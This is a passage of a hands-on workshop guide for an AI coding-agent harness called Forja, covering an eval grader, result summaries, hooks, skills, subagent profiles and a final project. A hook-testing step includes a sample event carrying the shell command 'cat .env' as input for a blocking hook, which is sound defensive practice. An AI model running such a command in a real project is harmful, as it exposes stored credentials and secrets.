3. Collect the `answer_contains` strings whose `norm(str(s))` is not in `norm(answer)`; if any, fail and list them.
4. For each `(src, dst)` in `chk.get("hidden") or {}`: create `(workdir / dst).parent` and `shutil.copy(repo_root / src, workdir / dst)`.
5. If there is a `command`, run it in `workdir` with `capture_output=True, text=True, timeout=chk.get("timeout", 120)`; handle `TimeoutExpired`.
6. On non-zero exit, join the last 3 non-empty-trimmed lines of `stdout + stderr` into the reason (e.g. `"check failed: " + " | ".join(tail)`).
7. Return `(True, "ok")`.

**Watch out for:**
- Copying `hidden` files BEFORE the `forbid_changes` check: your own copy counts as a change. The order matters.
- Not using `norm()`: `"VAT"` must match `"the vat"` in the test answer (case-insensitive; accents are stripped too).
- Copying hidden tests only when the command passes: `test_hidden_tests_copied_after` checks the file exists even though the check fails.
- Forgetting `cwd=workdir`: the command runs against the REAL playground (or the repo root) and the result is meaningless.
- Windows: `command` strings like `python -m pytest -q` need `python` on PATH → activate the venv in the terminal where you run evals.

<details><summary>💡 Hint 1</summary>

Cheap checks first, then the side effects (copy files), then the expensive one (run the command).

</details>

<details><summary>💡 Hint 2</summary>

`missing = [s for s in chk.get("answer_contains", []) if norm(str(s)) not in norm(answer)]`; `tail = (p.stdout + p.stderr).strip().splitlines()[-3:]`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
chk = task.check
if chk.get("forbid_changes") and ...: return False, "modified files in a read-only task"
missing = ...
if missing: return False, f"the answer is missing: {missing}"
for src, dst in ...: ...   # mkdir + copy
if chk.get("command"):
    try: p = subprocess.run(...)
    except subprocess.TimeoutExpired: return False, ...
    if p.returncode != 0: return False, "check failed: " + ...
return True, "ok"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l12_evals.py -k "grade or hidden or run_task" -v
```

#### TODO 12.2 · `forja/evals.py` · `summarize(results: list[TaskResult], model: str) -> dict`

**What it must do:** Returns a dict with keys: `model`; `runs` = number of results; `pass_rate` = passed / runs rounded to 3 decimals; `per_task` = `{task id: pass rate rounded to 2}` (grouping repetitions of the same id); `avg_steps` and `avg_seconds` = means rounded to 1 decimal (0 if there are no results); `total_tokens` = sum of tokens; `results` = `[asdict(r) for r in results]`. Test: 3 results → `pass_rate == 0.667`, `per_task == {"a": 0.5, "b": 1.0}`, `avg_steps == 4.0`, `total_tokens == 350`, `len(results) == 3`.

**Steps:**
1. Group the results by `r.id` into a dict of lists (`setdefault` is handy).
2. Compute the global pass rate; protect against division by zero for an empty list.
3. Compute the per-task pass rate from each group.
4. Compute the means of `steps` and `seconds` (guard empty input), and the token sum.
5. Assemble the dict with exactly the keys above; `results` via `asdict`.

**Watch out for:**
- Rounding: `pass_rate` 3 decimals (`0.667`), `per_task` 2 decimals, averages 1 decimal. The test uses `==`.
- `statistics.mean([])` raises `StatisticsError` → guard empty lists (the runner with a wrong `--only` gives zero results).
- `sum(r.passed for r in ...)` works because `True == 1`; don't count `reason == "ok"` instead.
- `run_evals.py` reads `rep["pass_rate"]`, `rep["avg_steps"]`, `rep["avg_seconds"]`, `rep["total_tokens"]`, `rep["per_task"]`, `rep["model"]` — a typo in a key name crashes the runner after all the (slow) runs.

<details><summary>💡 Hint 1</summary>

Group, then aggregate. Everything is a sum, a count or a mean.

</details>

<details><summary>💡 Hint 2</summary>

`by_task.setdefault(r.id, []).append(r)`; `round(statistics.mean(r.steps for r in results), 1)`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

```python
by_task = {}
for r in results: ...
n = len(results) or 1
return {
    "model": model, "runs": ...,
    "pass_rate": round(..., 3),
    "per_task": {k: round(..., 2) for k, v in by_task.items()},
    "avg_steps": ..., "avg_seconds": ..., "total_tokens": ...,
    "results": [asdict(r) for r in results],
}
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l12_evals.py -k summarize -v
```

### Run
```bash
python scripts/tasks.py test 12
python scripts/tasks.py evals --only fix_rounding
python scripts/tasks.py evals --repeat 3
python scripts/tasks.py evals --model qwen3-coder:30b --repeat 3
python scripts/tasks.py evals --repeat 3 --config playground/.forja --label config   # with your hooks, skills and subagents
```

### Try it in your agent
1. `python scripts/tasks.py evals --only vat_question` (read-only, fastest). Expected: `» …run_evals.py --only vat_question`, then a line like `PASS  vat_question           18.4s   4 steps` (or `FAIL … the answer is missing: ['calculate_vat']`), then the summary `qwen3:8b: pass_rate 100% · 4.0 steps · 18.4s/task · 9123 tokens`, `per task: {...}` and `-> out/evals_qwen3_8b.json`.
2. `python scripts/tasks.py evals --only fix_rounding` → a FAIL line shows the last 3 lines of pytest output as the reason. Note that your real `playground/` is never modified.
3. `python scripts/tasks.py evals --repeat 3` (all 5 tasks × 3; this takes a while on a laptop — start it and keep reading). Look at `per_task`: which tasks are flaky (0.33, 0.67)?
4. If you have a second model: `python scripts/tasks.py evals --model qwen3-coder:30b --repeat 3` (or the classroom server via `--backend openai_compat`). Open both `out/evals_*.json` files and compare `pass_rate`, `avg_steps`, `avg_seconds`, `total_tokens`.
5. Inspect a failure: in the JSON, `results[i].answer` (first 500 chars) and `stop_reason` (`max_steps`, `loop`, `error`…) usually tell you why.

### If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `grade(...) == (True, 'ok')` fails with `(False, 'modified files…')` in the forbid test | You copied hidden files or ran the command before the `forbid_changes` check, or compared against a fresh snapshot → check `snapshot(workdir) != before` first. |
| `test_grade_answer_and_forbid_changes`: 'the answer is missing: [VAT]' | Comparison is case-sensitive → apply `norm()` to both the expected string and the answer. |
| `test_hidden_tests_copied_after`: hidden file does not exist | You return before copying, or only copy on success → copy hidden files before running the command, whatever the result. |
| `test_run_task_pass_and_fail`: `ok.passed` is False / `steps != 5` | Earlier labs are broken in your harness (edit_file, bash, permissions in bypass) → run `python scripts/tasks.py test 03` and `test 04`; or `catchup 12` if you are short of time. |
| Every real eval FAILs with `EXCEPTION …` or `stop_reason: error` | The backend is not reachable or the model is not pulled → `forja doctor`, `ollama list`, check `.env`. |
| Windows: `check failed: 'python' is not recognized…` | The check command runs through cmd.exe and the venv isn't active in that terminal → `.venv\Scripts\activate` before running evals. |
| `StatisticsError: mean requires at least one data point` | `--only` with an unknown id gives zero results → guard empty lists in `summarize` (and check the id spelling). |
| Results vary a lot between runs | Models are not deterministic → always compare with `--repeat 3` or more and look at `per_task`, not at a single run. |

### You're done when
- [ ] [ ] `python scripts/tasks.py test 12` → 5 passed.
- [ ] [ ] You have at least one `out/evals_<model>.json` produced with `--repeat 3`.
- [ ] [ ] You can state, with numbers (pass rate, steps, seconds, tokens), which model you would use for which tasks.

### Final project step by step

Final project (16:00–17:00): customise Forja for the way YOU work and prove it with numbers. Five deliverables, each small. Work in `playground/` (or a real repo of yours for 1–4) and keep a short `NOTES` list of what you changed for the 3-minute demo. Budget: ~10 min per deliverable, 15 min for the evals.

#### AGENTS.md: global preferences + one per repo

**Where:** Global: `~/.forja/AGENTS.md` (macOS/Linux) · `%USERPROFILE%\.forja\AGENTS.md` (Windows; in PowerShell `$HOME\.forja\AGENTS.md`). Project: `AGENTS.md` (or `FORJA.md`) at the root of the repo; files are collected from the filesystem root down to `--cwd`, global first, so the closest one is the most specific.

1. Create the folder: macOS/Linux `mkdir -p ~/.forja` · PowerShell `New-Item -ItemType Directory -Force $HOME\.forja`.
2. Write 5–10 bullets of PERSONAL preferences (language, verbosity, test habits). Keep it short: it is sent on every turn.
3. In a real repo of yours, write `AGENTS.md` with: how to run tests, the build/lint command, conventions, and things that must never be done.
4. Verify it is loaded: start `forja --cwd <repo>` and ask `which instructions are you following?` — it should quote both layers (the prompt contains `## User global instructions` and `## Project instructions (AGENTS.md)`).

<details><summary>📄 Template</summary>

```markdown
# AGENTS.md — <project>

- Stack: <language/version>, <framework>.
- Tests: `<command>`. Run them after every code change.
- Lint/format: `<command>`.
- Conventions: <naming, error handling, logging>.
- Never: <edit generated files / touch migrations / change public APIs without asking>.
- When unsure, ask before large refactors.
```

</details>

> ⚠️ Evals run with a temporary home, so `~/.forja/AGENTS.md` is NOT used by `run_evals.py`; only `playground/AGENTS.md` (copied with the project) is. If you want to measure an instruction change, put it in `playground/AGENTS.md`.

#### A team skill

**Where:** `<project>/.forja/skills/<skill-name>/SKILL.md` (project) or `~/.forja/skills/<skill-name>/SKILL.md` (personal; project wins on name clash). Extra files (scripts, templates) can live in the same folder: the `skill` tool tells the model the folder path.

1. Pick a procedure you explain repeatedly: release checklist, code-review rubric, how to add an endpoint, DB migration steps…
2. Write the frontmatter: `name` (kebab-case, = folder name) and a `description` that says WHAT it is and WHEN to load it.
3. Write the body as numbered steps with exact commands. Keep it under ~60 lines.
4. Check discovery: `/tools` shows `skill`, and a prompt that needs it produces `⏺ skill <name>` as an early call.

<details><summary>📄 Template</summary>

```markdown
---
name: add-endpoint
description: How to add a REST endpoint in this repo (routing, validation, tests). Load it before creating or changing an endpoint.
---
# Adding an endpoint

1. Route in `<file>`; handler in `<folder>/<name>.py`.
2. Validate input with <library>; return <error format> on failure.
3. Add a test in `tests/<...>` covering success and one error.
4. Run `<test command>` before finishing.
```

</details>

> ⚠️ If the model never loads it, the description is too vague. Say when: 'Load it before …'. See `examples/project/.forja/skills/conventional-commits/SKILL.md`.

#### A hook that guarantees something you now ask for politely

**Where:** Script in `<project>/.forja/hooks/<name>.py`; registration in `<project>/.forja/settings.json` under `hooks.<Event>` (`PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`). Commands run with `cwd` = project root through the shell (cmd.exe on Windows).

1. Choose the event: block something → `PreToolUse`; give feedback after an edit (lint, compile, format check) → `PostToolUse`; 'don't finish until X' → `Stop`; inject context or filter prompts → `UserPromptSubmit`.
2. Write the script: read the event with `json.load(sys.stdin)` (`tool_name`, `tool_input`, and `tool_response` for PostToolUse; `prompt` for UserPromptSubmit), decide, print the reason to stderr and `sys.exit(2)` to block/feed back, `sys.exit(0)` otherwise.
3. Register it with a regex `matcher` (full match on the tool name, e.g. `edit_file|write_file`, `bash`, `mcp__issues__.*`); omit the matcher to apply to all.
4. Test the script alone first. macOS/Linux: `echo '{"tool_name":"bash","tool_input":{"command":"cat .env"}}' | python .forja/hooks/<name>.py; echo $?` · PowerShell: `'{"tool_name":"bash","tool_input":{"command":"cat .env"}}' | python .forja\hooks\<name>.py; $LASTEXITCODE`.
5. Then trigger it from the CLI and check you see `BLOCKED by hook: …` (Pre) or `[hook PostToolUse] …` in the tool result (Post).

<details><summary>📄 Template</summary>

```python
"""PostToolUse (edit_file|write_file): <what it guarantees>. Exit 2 = feedback to the model."""
import json, subprocess, sys

event = json.load(sys.stdin)
path = event.get("tool_input", {}).get("path", "")
if not path.endswith(".py"):
    sys.exit(0)
p = subprocess.run(["ruff", "check", "--quiet", path], capture_output=True, text=True)
if p.returncode != 0:
    print(f"Lint errors in {path}:\n{p.stdout[-2000:]}", file=sys.stderr)
    sys.exit(2)
sys.exit(0)
```
```json
"hooks": {"PostToolUse": [{"matcher": "edit_file|write_file", "command": "python .forja/hooks/lint.py", "timeout": 30}]}
```

</details>

> ⚠️ Exit 1 does NOT block (it is recorded as a hook error and ignored): use exit 2. A slow `Stop` hook runs on every final answer — keep it fast (`-x`, a subset of tests).

#### A specialised subagent profile

**Where:** `<project>/.forja/agents/<name>.md`. Frontmatter keys read by `load_profiles`: `name`, `description` (required), `tools` (list or `a, b` string; default `read_file, grep, glob`), `max_steps` (default 25). Valid tool names: `read_file`, `write_file`, `edit_file`, `glob`, `grep`, `bash`, `todo_write`, `skill`, `mcp__<server>__<tool>` (`task` is always removed). The body is its system prompt.

1. Pick a narrow job where a clean context helps: test-failure triage, security review, docs writer, dependency auditor, `tester` that only runs pytest.
2. Give it the MINIMUM tools. Read-only roles: `read_file, grep, glob` (+ `bash` if it needs `git diff`/pytest, and add matching `allow` rules in settings).
3. Write the description from the main agent's point of view: what it does and when to delegate to it.
4. Write the body: role, method (numbered), and the exact output format you want back (it is all the main agent will see).
5. Check: the profile appears in the `task` tool description; ask `use the <name> subagent to …` and look for `[<name>]`-prefixed calls.

<details><summary>📄 Template</summary>

```markdown
---
name: tester
description: Runs the test suite and explains failures with the likely cause and file:line. Use it after code changes or when tests fail.
tools: read_file, grep, glob, bash
max_steps: 15
---
You are a test triage specialist. Only run `python -m pytest` commands with bash; never modify files.
1. Run the suite (`python -m pytest -q -x`).
2. For each failure, read the test and the code under test.
Answer with: a one-line verdict, then per failure `test name — cause — path:line — suggested fix (1 sentence)`.
```

</details>

> ⚠️ Tool restriction is by tool NAME; a `bash` subagent can run any command your permissions allow. To restrict commands, rely on `allow`/`deny` rules (e.g. `bash(python -m pytest*)`) and on approvals — subagent calls go through the same gate as the main agent.

#### An eval task for your daily work + a 2-model report

**Where:** Append the task to `evals/tasks.yaml` (at the END: `test_tasks_file` expects `fix_rounding` and `fix_due_date` to stay first). Hidden tests go in `evals/hidden/` and are referenced as `{"evals/hidden/<file>.py": "tests/<dest>.py"}`. Reports go to `out/evals_<model>.json`. Tasks always run on a copy of `playground/`, so express your daily work against the invoices project.

1. Pick a task type you do every week: a small bug fix, a feature with tests, a refactor that must keep tests green, or a code question.
2. Write the prompt like a ticket (what, not how). Choose an OBJECTIVE check: `command` (tests), `hidden` (tests the agent can't see — best for features), `answer_contains` (+ `forbid_changes: true` for questions).
3. For a `hidden` check, write the hidden test file in `evals/hidden/` and verify it FAILS on the untouched playground (otherwise the task measures nothing).
4. Run it alone: `python scripts/tasks.py evals --only <id> --repeat 3`. Iterate the prompt/check until a pass means 'done right'.
5. Run the same task (or the full suite) with two models: `python scripts/tasks.py evals --model qwen3:8b --repeat 3` and `python scripts/tasks.py evals --model qwen3-coder:30b --repeat 3` (or `--backend openai_compat` / `--backend openrouter --model <open-weight model>`).
6. Write the report: a table from the two JSON files (pass rate, per_task for your task, avg steps, avg seconds, total tokens) + 2–3 sentences of conclusion.

<details><summary>📄 Template</summary>

```yaml
- id: my_overdue_flag
  prompt: "Add a method Invoice.is_overdue(today) that returns True when today is after the due date. Add a test."
  check: {command: "python -m pytest -q tests/test_overdue_hidden.py", hidden: {"evals/hidden/test_overdue.py": "tests/test_overdue_hidden.py"}}

- id: my_question
  prompt: "Without modifying anything: where is the due date computed and what happens on weekends?"
  check: {answer_contains: ["dates.py", "due_date"], forbid_changes: true}
```
Report skeleton (Markdown):
```markdown
| model | pass rate | my task | avg steps | avg s | tokens |
|---|---|---|---|---|---|
| qwen3:8b | 0.60 | 0.33 | 9.1 | 41.0 | 120k |
| qwen3-coder:30b | … | … | … | … | … |

Conclusion: <which model for which task, and why>.
```
To print the numbers: `python -c "import json,glob; [print(r['model'], r['pass_rate'], r['per_task'], r['avg_steps'], r['avg_seconds'], r['total_tokens']) for r in map(lambda f: json.load(open(f, encoding='utf-8')), glob.glob('out/evals_*.json'))]"`

</details>

> ⚠️ By default `run_task` copies the playground WITHOUT `.forja/` (only `playground/AGENTS.md` counts). To measure your configuration run twice and compare: `python scripts/tasks.py evals --repeat 3 --label base` and `python scripts/tasks.py evals --repeat 3 --config playground/.forja --label config`. `~/.forja/AGENTS.md` is never used (temp home). MCP paths in `settings.json` resolve from the temp copy, so use absolute paths with `--mcp`.

#### 3-minute demo
1. 3 minutes per person/pair: 30 s what you added (show the files), 90 s one live prompt where a skill/hook/subagent visibly kicks in, 60 s the eval table and your conclusion.
2. Bring numbers, not impressions: 'pass rate on my task went from 0.33 to 1.0 with qwen3-coder:30b at 2× the time'.

#### You're done when
- [ ] [ ] Global and project `AGENTS.md` exist and the agent can quote them.
- [ ] [ ] One skill is loaded by the agent (`⏺ skill <name>`) when relevant.
- [ ] [ ] One hook visibly blocks or feeds back (`BLOCKED by hook` / `[hook PostToolUse]`).
- [ ] [ ] One subagent profile is listed in the `task` description and used (`[<name>]` calls).
- [ ] [ ] One new task in `evals/tasks.yaml`, `python scripts/tasks.py test 12` still passes, and two `out/evals_*.json` reports compared in a table.

### Checkpoint
You have a report in `out/` and can say, with numbers, which model you'd use for which tasks.

### Challenges
1. Add your own task to `evals/tasks.yaml`.
2. Compare your harness with and without `todo_write` in the base prompt.

**Tests:** `tests/test_l12_evals.py` · **Fallen behind?** `python scripts/tasks.py catchup end`


---

## Final project (day 2, 16:00–17:00): your Forja

Customise your agent for the way you work and prove it with numbers:

1. `~/.forja/AGENTS.md` with your preferences and an `AGENTS.md` for a real repo of yours.
2. A **skill** from your team (conventions, deployment, review…).
3. A **hook** that guarantees something you currently ask for politely (tests, linter, secrets).
4. A specialised **subagent**.
5. An **eval task** representing your daily work, and the report comparing two models.

3-minute demo per person or pair: what you added and what changed in the evals.

---

## Glossary
- **Agent** — Model + tools + loop that decides and acts until a task is done.
- **Harness** — Everything around the loop: permissions, context, UI, hooks, sessions.
- **Tool call** — Structured request (name + JSON arguments) the model makes to the harness. The model executes nothing.
- **Streaming** — Receiving the response in pieces as it's generated.
- **Context window** — Maximum tokens the model sees at once.
- **Compaction** — Shrinking history (blanking old outputs, summarising) so it fits.
- **Plan mode** — Read-only mode where the agent proposes a plan before acting.
- **Subagent** — Agent launched by another with a clean context and restricted tools.
- **Hook** — Command the harness runs at a fixed point; can block (exit 2).
- **Skill** — Instructions loaded on demand; only the description goes in the prompt.
- **MCP** — Standard protocol to connect external tools to an agent.
- **Eval** — Task with an objective check to measure an agent or a model.
